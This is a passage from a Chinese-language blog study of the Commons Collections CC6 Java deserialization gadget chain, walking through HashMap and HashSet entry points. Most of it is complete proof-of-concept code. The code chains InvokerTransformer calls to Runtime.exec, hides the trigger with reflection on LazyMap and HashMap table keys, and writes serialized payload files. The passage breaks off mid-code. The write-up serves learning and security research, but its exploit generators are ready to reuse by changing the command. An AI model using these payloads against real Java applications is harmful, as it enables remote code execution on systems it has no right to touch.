class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        map.put(TM,<span class="number">111</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h4><p>上面学习的时候通过反射修改链转换器来实现本地序列化时触发的代码执行，还可以通过反射修改hashmap的key值，达到规避本地触发的问题。<br>hashmap底层通过table表将map的键值对存储到table表的node节点对象中，修改hashmap的key值，实际就是修改table中的key值</p><p>先通过反射获取hashmap的table表属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(map);</span><br></pre></td></tr></table></figure><p>然后获取table表中存在key的元素，也就是要修改的元素，由于不同环境下key值存在的序号不同，就写了个循环去查找避免找不到，比如我这序号是13</p><p><img src="/posts/9758c0a8/cc6-31.png" title="读取元素"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后反射更改key值为触发对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化即可，得到完整POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        map.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(map);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">           node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload1-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload1-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/posts/9758c0a8/cc6-32.png" title="读取元素"></p><h3 id="实现思路二：HashSet"><a href="#实现思路二：HashSet" class="headerlink" title="实现思路二：HashSet"></a>实现思路二：HashSet</h3><h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><p>另外一种实现通过HashSet进行调用，先看看HashSet是干嘛的</p><blockquote><p>HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。<br>HashSet 允许有 null 值。<br>HashSet 是无序的，即不会记录插入的顺序。<br>HashSet 不是线程安全的， 如果多个线程尝试同时修改 HashSet，则最终结果是不确定的。 您必须在多线程访问时显式同步对 HashSet 的并发访问。<br>HashSet 实现了 Set 接口。</p></blockquote><p>简述就是HashSet是一个无序且无重复元素的集合，只有Key值（可以理解为value值固定的hashmap），HashMap为键值对key-value形式。</p><p><img src="/posts/9758c0a8/cc6-15.png" title="HashSet"></p><p>其中会内置一个<code>transient</code>类型的<code>hashmap-map</code>变量，构造方法会自动对<code>map</code>对象进行<code>hashmap</code>实例化。</p><p>回到利用链来，上面的时候分析到<code>hashmap</code>在<code>put</code>元素时，将<code>TiedMapEntry</code>对象<code>put</code>进<code>map</code>中，在对元素进行<code>hash()</code>时会自动调用<code>TiedMapEntry.hashCode()</code>方法，达到执行代码的目的。</p><p>因此重点就在<code>hashmap</code>的<code>put</code>操作，就找<code>HashSet</code>在哪对<code>map</code>对象进行了put操作，且<code>put</code>的<code>key</code>得我们可控才行。</p><p>发现<code>HashSet</code>中，<code>add</code>操作调用了，重写的<code>readObject</code>中也调用了</p><p><img src="/posts/9758c0a8/cc6-17.png" title="add"></p><p><code>add</code>操作相当于<code>hashmap</code>把<code>value</code>值固定了，然后把传入<code>key</code>进行<code>put</code>操作，底层上还是<code>hashmap</code>的操作，然后实现方法同样，<code>put</code>值就能触发。</p><p><img src="/posts/9758c0a8/cc6-18.png" title="实现方法"></p><p>再看序列化和反序列化，虽然其中的<code>map</code>变量是<code>transient</code>修饰的，无法对<code>map</code>进行序列化，但序列化过程会遍历<code>map</code>中元素，把元素写入流中，再通过反序列化把流写入新的<code>hashmap</code>的<code>map</code>中。</p><p><img src="/posts/9758c0a8/cc6-16.png" title="readObject中put"></p><p>在<code>HashSet</code>中重写的<code>readObject</code>中对<code>map</code>进行了<code>put</code>操作，对反序列化的操作注解写在里面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//判断底层hashmap流容量</span></span><br><span class="line">        <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                             capacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断加载因子，通俗就是说查看该map的装入的元素会不会超过设定的加载大小，例如容量大小为16，加载因子设置为0.5，就是装入元素为8个，超过8个就超过了设置的预期值，用来设置预期装入的容量大小。</span></span><br><span class="line">        <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断底层hashmap流大小</span></span><br><span class="line">        <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> +</span><br><span class="line">                                             size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面条件都满足就急计算底层hashmap流的实际可容量</span></span><br><span class="line">        <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">        <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">        capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//创建上述条件下的hashmap对象，用来写入</span></span><br><span class="line">        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//循环读取元素然后put入hashmap的map中</span></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看下来基本不需要去绕过上面的限制，默认情况下都是满足条件的，只需要对序列化的对象进行反序列化读取，然后写入到map中，接下来再去看序列化写入，看写入的参数是否可控。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//对非static或transient类型的数据进行写入</span></span><br><span class="line">        <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把底层hashmap的容量和加载因子写入</span></span><br><span class="line">        <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">        s.writeInt(map.capacity());</span><br><span class="line">        s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把底层hashmap的大小写入</span></span><br><span class="line">        <span class="comment">// Write out size</span></span><br><span class="line">        s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把map中元素依次进行写入</span></span><br><span class="line">        <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">            s.writeObject(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到虽然<code>map</code>为<code>transient</code>类型无法序列化，但写入过程基本把<code>map</code>的信息读取出来依次写入流中，再通过反序列化读取重新写入到新的<code>hashmap</code>对象中。</p><h4 id="POC-1-1"><a href="#POC-1-1" class="headerlink" title="POC-1"></a>POC-1</h4><p>通过上面的学习，发现同思路一的poc，把入口点换成<code>HashSet</code>，相当于多走了一步弯路，思路一中直接通过<code>hashmap</code>对象<code>put</code>值进行触发，这通过<code>hashset</code>进行<code>add</code>值去触发<code>hashmap.put</code>进行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        <span class="comment">//通过HashSet add值去触发漏洞</span></span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(TM);</span><br><span class="line">        <span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">        map.remove(<span class="number">11</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/posts/9758c0a8/cc6-19.png" title="实现效果"></p><h4 id="POC-2-1"><a href="#POC-2-1" class="headerlink" title="POC-2"></a>POC-2</h4><p>同实现思路一的POC-2的分析学习，规避本地序列化也可以通过反射修改key值<br>不过不同的是思路二用HashSet作为入口，因此在修改key值时，需要对HashSet中的map的table表中的key进行修改。<br>同时由于不修改链转换器，且添加的key值任意不为11即可，因此无需像POC-1那样删除key为11的元素。</p><p>因此先获取获取<code>hashset</code>中的<code>hashmap</code>对象属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">HashMap hsmap=(HashMap) hsset.get(hs);</span><br></pre></td></tr></table></figure><p>再获取hashmap中的table属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(hsmap);</span><br></pre></td></tr></table></figure><p>获取table属性过后，再获取table中存在的key值，并进行修改为目标触发的对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化触发漏洞即可，得到完整POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap hsmap=(HashMap) hsset.get(hs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> 